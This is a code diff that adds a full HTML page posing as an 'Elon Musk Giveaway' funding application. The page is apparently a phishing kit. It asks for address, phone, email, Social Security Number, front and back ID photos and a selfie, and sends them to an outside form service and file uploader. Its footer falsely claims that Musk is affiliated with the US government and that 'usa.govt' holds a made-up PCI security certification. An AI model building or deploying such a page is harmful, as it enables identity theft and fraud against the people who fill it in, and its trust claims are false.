@@ -1,0 +1,785 @@
+<!Doctype html>
+<html lang='en'>
+<head>
+
+<!-- HTML Meta Tags -->
+
+<meta charset='UTF-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1.0'>
+<meta name='author' content='Daniel ball'>
+<meta name='keywords' content='HTML, CSS, JavaScript'>
+<meta name='description' content='Its Elon Musk giveaway again, Dont miss out on this amazing opportunit!'>
+<title>Elon Musk Giveaway</title>
+
+<!-- Social Media Meta tags -->
+
+<meta property='og:title' content="Elon Musk Giveaway">
+<meta property='og:description' content='Its Elon Musk giveaway again, Dont miss out on this amazing opportunit!'>
+<meta property='og:image' content='IMG_8454.JPG'>
+
+<link rel='stylesheet' href='styles.css'>
+<link rel="icon" type='image/x-icon' href="favicon.ico">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap');
+
+
+*{
+padding: 0;
+margin: 0;
+box-sizing: border-box;
+font-family: Montserrat;
+}
+
+header {
+width: 100%;
+height: 50px;
+padding: 10px;
+display: flex;
+position: relative;
+margin-bottom: 150px;
+align-item: center;
+justify-content: space-between;
+box-shadow: 0 5px 10px gray;
+background: white;
+z-index: 99;
+}
+
+#menubar {
+display: none;
+}
+
+header label {
+font-size: 30px;
+margin-left: 10px;
+color: navy;
+display: initial;
+}
+
+header img {
+width: 80px;
+position: absolute;
+left: 40%;
+}
+
+header .register {
+font-size: 30px;
+margin-right: 10px;
+color: navy;
+}
+
+header .navbar {
+display: none;
+position: absolute;
+left: 0;
+right: 0;
+top: 100%;
+background: navy;
+box-shadow: 0 5px 10px darkblue;
+width: 150px;
+height: 250px;
+padding: 10px;
+justify-content: left;
+}
+
+header .navbar nav ul{
+display: blcok;
+list-style-type: none;
+}
+
+header .navbar nav ul li {
+padding: 10px;
+border-bottom: 1px solid white;
+}
+
+header .navbar nav ul li a{
+text-decoration: none;
+color: white;
+font-size: 20px;
+font-weight: 500;
+}
+
+header .navbar ul li:last-child {
+border-bottom: none;
+}
+
+header .navbar button {
+font-size: 20px;
+font-weight: 500;
+align-item: center;
+border: 1px solid white;
+border-radius: 10px;
+background: white;
+color: navy;
+margin-top: 10px;
+padding: 10px;
+width: 100px;
+}
+
+#menubar:checked ~ .navbar {
+display: initial;
+}
+
+.Top{
+background: darkblue;
+width: 100%;
+height: 300px;
+text-align: center;
+align-text: center;
+margin-bottom: 60px;
+}
+
+.H1{
+color: white;
+padding-top: 50px;
+font-size: 23px;
+font-weight: 400;
+}
+
+
+.Registration{
+font-size: 53px;
+font-weight: 500;
+color: white;
+}
+
+.instruction > p{
+font-size: 23px;
+font-weight: 300;
+padding: 0px 15px 20px 15px;
+}
+
+form{
+margin: 20px 15px 100px 15px;
+}
+
+
+.box-1{
+position: relative;
+diplay: block;
+padding: 30px 15px 30px 15px;
+background: lightgrey;
+border: 0px;
+border-radius: 10px;
+margin-bottom: 30px;
+}
+
+form .box-1 > label{
+font-size: 17px;
+font-weight: 500;
+}
+
+form .box-1 > input{
+width: 90%;
+height: 30px;
+border: 1px solid grey;
+border-radius: 3px;
+margin: 5px 0px 25px 0px;
+color: black;
+font-size: 13px;
+font-weight: 500;
+outline: none;
+}
+
+input[type='text'],[type='email'],[type='tel']{
+padding-left: 10px;
+}
+
+
+form .box-1 > select{
+width: 97%;
+height: 40px;
+border: 1px solid grey;
+border-radius: 30px;
+color: black;
+font-size: 13px;
+font-weight: 500;
+margin: 5px 0px 10px 0px;
+}
+
+
+.box-2{
+position: relative;
+display: block;
+padding: 20px 15px 40px 15px;
+background: lightgrey;
+border: 0px;
+border-radius: 10px;
+font-size: 20px;
+margin-bottom: 30px;
+}
+
+form .box-2 > label{
+font-size: 17px;
+font-weight: 500;
+}
+
+form .box-2 > input{
+width: 90%;
+height: 30px;
+border: 1px solid grey;
+border-radius: 3px;
+margin: 5px 0px 25px 0px;
+color: black;
+font-size: 13px;
+font-weight: 500;
+outline: none;
+}
+
+
+form .box-2 > select{
+width: 97%;
+height: 40px;
+border: 1px solid grey;
+border-radius: 30px;
+margin: 5px 0px 15px 0px;
+color: black;
+font-size: 13px;
+font-weight: 500;
+}
+
+.box-3{
+display: block;
+position: relative;
+padding: 30px 15px 30px 15px;
+background: lightgrey;
+border: 0px;
+border-radius: 10px;
+margin-bottom: 20px;
+}
+
+.box-3 > p{
+font-size: 17px;
+font-weight: 500;
+margin-bottom: 5px;
+}
+
+
+.box-3 > label{
+position: relative;
+font-size: 20px;
+font-weight: 300;
+}
+
+.box-3 > select{
+width: 97%;
+height: 40px;
+border: 1px solid grey;
+border-radius: 30px;
+margin: 0px 0px 15px 0px;
+color: black;
+font-size: 13px;
+font-weight: 500;
+}
+
+.box-3 textarea{
+width: 90%;
+height: 150px;
+font-size: 17px;
+padding: 15px;
+margin-bottom: 20px;
+}
+
+form .box-3 > input{
+width: 90%;
+height: 30px;
+border: 1px solid grey;
+border-radius: 3px;
+margin: 5px 0px 25px 0px;
+font-size: 13px;
+font-weight: 500;
+outline: none;
+}
+
+
+form .box-3 > .check label{
+font-size: 17px;
+}
+
+
+.instruction > p{
+font-size: 23px;
+font-weight: 300;
+padding: 0px 15px 20px 15px;
+}
+
+form{
+margin: 20px 15px 50px 15px;
+}
+
+.box-4{
+position: block;
+diplay: block;
+padding: 30px 15px 50px 15px;
+background: lightgrey;
+border: 0px;
+border-radius: 10px;
+margin-bottom: 30px;
+}
+
+.box-4 > p{
+font-size: 17px;
+font-weight: 500;
+margin-bottom: 5px;
+}
+
+
+form .box-4 > label{
+font-size: 17px;
+font-weight: 500;
+}
+
+form .box-4 > input[type='tel']{
+width: 30%;
+height: 30px;
+border: 1px solid grey;
+border-radius: 3px;
+margin: 5px 0px 25px 0px;
+padding-left: 10px;
+color: black;
+font-size: 13px;
+font-weight: 500;
+}
+
+
+form .box-4 > input[id='ssn']{
+width: 90%;
+height: 30px;
+border: 1px solid grey;
+border-radius: 3px;
+margin: 5px 0px 25px 0px;
+padding-left: 10px;
+color: black;
+font-size: 13px;
+font-weight: 500;
+}
+
+
+.small-1{
+margin: 0px 0px 0px;
+display: block;
+position: relative;
+}
+
+
+.fileupload{
+width: 70%;
+height: 70px;
+background: white;
+border-radius: 10px;
+text-align: center;
+margin-top: 5px;
+}
+
+.fileupload > lr-file-uploader-regular{
+position: relative;
+top: 20px;
+background: darkblue;
+}
+
+
+form .box-4 > .check input[type='checkbox']{
+padding: 7px;
+width: 0px
+}
+
+form .box-4 > label{
+font-size: 17px;
+}
+
+form > .submit{
+position: relative;
+width: 90%;
+text-align: center;
+align-itmes: center;
+}
+
+form .submit > button[type='submit']{
+background: green;
+width: 200px;
+height: 50px;
+margin-bottom: 50px;
+border: 0px;
+border-radius: 10px;
+font-size: 15px;
+cursor: pointer;
+}
+
+.submit > .ssl{
+position: absolute;
+text-align: center;
+}
+
+
+footer{
+background-color: navy;
+padding: 30px 30px 20px 15px;
+}
+
+
+footer h2 {
+font-size: 25px;
+font-weight: 500;
+margin-bottom: 50px;
+color: white;
+line-height: 30px;
+}
+
+footer #contact h3 {
+font-size: 20px;
+font-weight: 500;
+color: lightgreen;
+}
+
+footer #contact p {
+font-size: 12px;
+font-weight: 500;
+}
+
+footer p {
+color: white;
+font-size: 12px;
+font-weight: 500;
+}
+</style>
+
+<style>
+.my-config{
+--darkmode: 0;
+--h-accent: 258;
+--s-accent: 68%;
+--l-accent: 42%;
+}
+</style>
+
+</head>
+
+<body>
+
+<header>
+<input type='checkbox' id='menubar' name='menubar'>
+<label for='menubar'><i class="fa-solid fa-bars"></i></label>
+
+<div class='navbar'>
+<nav>
+<ul>
+<li><a href='index.html'>Home</a></li>
+<li><a href='index.html'>Reason</a></li>
+<li><a href='#contact'>contact</a></li>
+
+<li></li>
+</ul>
+</nav>
+
+<a href='form.html'><button>Apply</button></a>
+</div>
+
+<a href='index.html'><img src='IMG_8466.jpg' alt='Logo' ></a>
+
+
+<a href='form.html' class='register'><i class="fa-solid fa-user"></i></a>
+
+</header>
+
+
+<div class='Top'>
+<p class='H1'>Elon Musk's Funding Applications</p>
+
+<p class='Registration'>Registration<br>Form</p>
+
+</div>
+
+<div class='instruction'>
+<p><strong>Step 1 of 2:</strong> Tell us about yourself</p>
+</div>
+
+<form action="https://submit-form.com/3xFM1lI6m">
+
+<div class='box-1'>
+
+<label for='first name'>First Name:</label>
+<br>
+<input type='text' id='first name' name='first name' required>
+<br>
+
+<label for='last name'>Last Name:</label>
+<br>
+<input type='text' id='last name' name='last name' required>
+<br>
+
+<label for='street address'>Street Address:</label>
+<br>
+<input type='text' id='street address' name='street address' required>
+<br>
+
+<label for='city'>City:</label>
+<br>
+<input type='text' id='city' name='city' required>
+<br>
+
+<label for='zipcode'>Zip Code:</label>
+<br>
+<input type='text' id='zipcode' name='zipcode' oninput='this. value = this.value.replace(/[^0-9]/g, "")' required>
+<br>
+
+<label for='state'>State:</label>
+<br>
+<select id='state' name='state'>
+<option></option>
+<option value='alabama'>Alabama</option>
+<option value='alaska'>Alaska</option>
+<option value='american samoa'>American Samoa</option>
+<option value='arizona'>Arizona</option>
+<option value='arkansas'>Arkansas</option>
+<option value='california'>California</option>
+<option value='colorado'>Colorado</option>
+<option value='connecticut'>Connecticut</option>
+<option value='delaware'>Delaware</option>
+<option value='district of columbia'>District of Columbia</option>
+<option value='florida'>Florida</option>
+<option value='georgia'>Georgia</option>
+<option value='guam'>Guam</option>
+<option value='hawaii'>Hawaii</option>
+<option value='idaho'>Idaho</option>
+<option value='illinois'>Illinois</option>
+<option value='indiana'>Indiana</option>
+<option value='iowa'>Iowa</option>
+<option value='kansas'>Kansas</option>
+<option value='kentucky'>Kentucky</option>
+<option value='louisiana'>Louisiana</option>
+<option value='maine'>Maine</option>
+<option value='maryland'>Maryland</option>
+<option value='massachusetts'>Massachusetts</option>
+<option value='michigan'>Michigan</option>
+<option value='minnesota'>Minnesota</option>
+<option value='mississippi'>Mississippi</option>
+<option value='missouri'>Missouri</option>
+<option value='montana'>Montana</option>
+<option value='nebraska'>Nebraska</option>
+<option value='nevada'>Nevada</option>
+<option value='new hampshire'>New Hampshire</option>
+<option value='new jersey'>New Jersey</option>
+<option value='new mexico'>New Mexico</option>
+<option value='new york'>New York</option>
+<option value='north carolina'>North Carolina</option>
+<option value='north dakota'>North Dakota</option>
+<option value='northen mariana islands'>Northen Mariana Islands</option>
+<option value='ohio'>Ohio</option>
+<option value='oklahoma'>Oklahoma</option>
+<option value='oregon'>Oregon</option>
+<option value='palau'>Palau</option>
+<option value='pennsylvania'>Pennsylvania</option>
+<option value='rhode island'>Rhode Island</option>
+<option value='south carolina'>South Carolina</option>
+<option value='south dakota'>South Dakota</option>
+<option value='tennessee'>Tennessee</option>
+<option value='texas'>Texas</option>
+<option value='utah'>Utah</option>
+<option value='vermont'>Vermont</option>
+<option value='virginia'>Virginia</option>
+<option value='washington'>Washington</option>
+<option value='west virginia'>West Virginia</option>
+<option value='wisconsin'>Wisconsin</option>
+<option value='wyoming'>Wyoming</option>
+</select>
+</div>
+
+<div class='box-2'>
+
+<label for=' gender'>Gender:</label>
+<br>
+<select id='gender' name='genter'>
+<option></option>
+<option value='male'>Male</option>
+<option value='female'>Female</option>
+</select>
+<br>
+
+<label for='age'>What is Your Age?</label>
+<br>
+<select id='age' name='age'>
+<option></optgroup>
+<option value='18-25'>18-25</option>
+<option value='26-34'>26-34</option>
+<option value='35-49'>35-49</option>
+<option value='50-65'>50-65</option>
+<option value='66-80'>66-80</option>
+<option value='80 +'>80 +</option>
+</select>
+<br>
+
+<label for='citizenship'>Citizenship Status:</label>
+<br>
+<select id='citizenship' name='citizenship'>
+<option></option>
+<option value='u.s citizen'>U.S Citizen</option>
+<option value='resident alien'>Resident Alien</option>
+<option value='green card holder'>Green Card Holder</option>
+<option value='permanent resident'>Permanent Resident</option>
+<option value='not sure'>Not Sure</option>
+</select>
+<br>
+
+<label for='status'>Employment Status:</label>
+<select id='status' name='status'>
+<option></option>
+<option value='employed-ft'>Employed Full-Time</option>
+<option value='employed-pt'>Employed Part-Time</option>
+<option value='self-employed'>Self Employed</option>
+<option value='unemployed'>Unemployed</option>
+<option value='retired'>Retired</option>
+<option value='c.s.s'>Collecting Social Security</option>
+<option value='disabled'>Disabled</option>
+</select>
+<br>
+
+<label for='phone'>Phone Number:</label>
+<br>
+<input type='tel' id='phone' name='phone' max='10' required>
+
+</div>
+
+<div class='box-3'>
+
+<p>How Much Money Are You Going To Need?</p>
+
+<select id='amount' name='amount' required>
+<option></option>
+<option value='$500-$10,000'>$500-$10,000</option>
+<option value='$10,000-$25,000'>$10,000-$25,000</option>
+<option valeu='$25,000-$50,000'>$25,000-$50,000</option>
+<option value='$50,000-$100,000'>$50,000-$100,000</option>
+<option value='$100,000 or more'>$100,000 or More</option>
+</select>
+<br>
+
+<p>Briefly Describe How You Will Use The Money:</p>
+
+<textarea name='message-1' rows='10' cols='30' required></textarea>
+<br>
+
+<p>How Soon Do You Need The Money?</p>
+
+<textarea name='message-2' rows='10' cols='30' required></textarea>
+<br>
+
+<p>What Email Address Would You Like To Use As Your Username For Your Online Application Account?</p>
+
+<input type='email' id='email' name='email' placeholder='yourmail@gmail.com' required>
+<br>
+
+<small><i>** Your <u>Email</u> is <u>safe</u>. We hate spam as much as you do!!<br>
+** Please double check it to be sure it is accurate!</i></small>
+
+</div>
+<br>
+
+<div class='instruction'>
+<p><strong>Step 2 of 2:</strong> Upload your Documents for a Security Reason:</p>
+</div>
+
+<div class='box-4'>
+
+<p>This's to assured that the money was receiving by you</p>
+
+<br>
+<br>
+<br>
+<br>
+
+<label for='ssn'>Social Security Number:</label>
+<br>
+<input type='tel' id='ssn' name='ssn' required>
+
+<small class='small-1'><i>** Kindly input your Social Security Number for a security reason,<br>
+** "Inacurrate" may cause application decline.</i></small>
+<br>
+<br>
+<br>
+<br>
+
+
+<label for='file'>Upload Front & Back of ID:</label>
+<br>
+
+<div class='fileupload'>
+<lr-file-uploader-regular css-src="https://cdn.jsdelivr.net/npm/@uploadcare/blocks@0.38.1/web/lr-file-uploader-regular.min.css" ctx-name="my-uploader" class="my-config">
+</lr-file-uploader-regular>
+
+</div>
+<br>
+
+<small class='small-2'><i>** Kindly upload "Front" and "Back" of your Valid ID Card 🪪 in clearly image and make the sure all four edges of the card shows, <br>** <u>Note:</u> Blurred or too much Darker of image may cause application declined.</i></small>
+<br>
+<br>
+<br>
+<br>
+
+<label for='selfie'>Take a selfie of your face:</label>
+<br>
+
+<input type='file' id='selfie' name='selfie' accept='image/*' capture='user'>
+<br>
+<br>
+<br>
+<br>
+<br>
+
+
+<input type='checkbox' id='checkbox'name='checkbox' required>
+<label for='checkbox'>I understand that my entry into this giveaway is subject to the official rules and regulation, and i agree to receive and/ or message from the sponsor(s) of this giveaway and understand that my <span style='color: red;'>"Information"</span> will be used in accordance with their privacy policy.</label>
+
+</div>
+
+
+<div class='submit'>
+<button type='submit'>Submit</button>
+</div>
+<br>
+
+<center>
+<img class='ssl' src='ssl_logo.png'>
+</center>
+</div>
+</form>
+
+<footer>
+<h2>Smarter, faster on what<br>matters.</h2>
+
+<section id='contact'>
+<h3>Contact:</h3>
+<br>
+<p>Text for more information.</p>
+<br>
+<p><i class="fa-regular fa-envelope"></i> (717) 573-1227</p>
+</section>
+
+<br>
+<br>
+<br>
+
+<p style='color: white;'>Powered by Elon Musk and United State of America Copyright <span class='icon'><i class="fa-regular fa-copyright fa-flip fa-2xs"></i></span> 2024</p>
+
+<hr style='margin: 15px 0px 15px 0px;'>
+<p> Elon musk is affiliated with the United States Government but not any other funding agency. usa.govt supplies training materials on how to apply for funding as well as resources on where to apply. </p>
+<br>
+<p>On sept.12th, 2024, usa.govt met the PCI data security requirements by passing a SecurityMetrics® Vulnerability Assessment.
+<br>
+<br>
+usa.govt is tested quarterly to ensure that high security standards are maintained, which significantly reduces the risk that this site will be compromised and ID card or other sensitive data will be stolen or misused.
+<br>
+<br>
+Disclaimer: This certificate confirms the site listed above has been tested for common security weaknesses and no significant security vulnerabilities were found at the date shown above. This certificate does not imply the website shown above is completely invulnerable to unauthorized attacks.</p>
+</footer>
+
+<script type="module"> import * as LR from "https://cdn.jsdelivr.net/npm/@uploadcare/blocks@0.38.1/web/lr-file-uploader-regular.min.js"; LR.registerBlocks(LR);
+</script>
+
+<lr-config ctx-name="my-uploader" pubkey="8218b363db13fd3ae922" max-local-file-size-bytes="10000000" multiple-max="2" img-only="true" source-list="local, camera" use-cloud-image-editor="false"></lr-config>
+
+</body>
+
+</html>
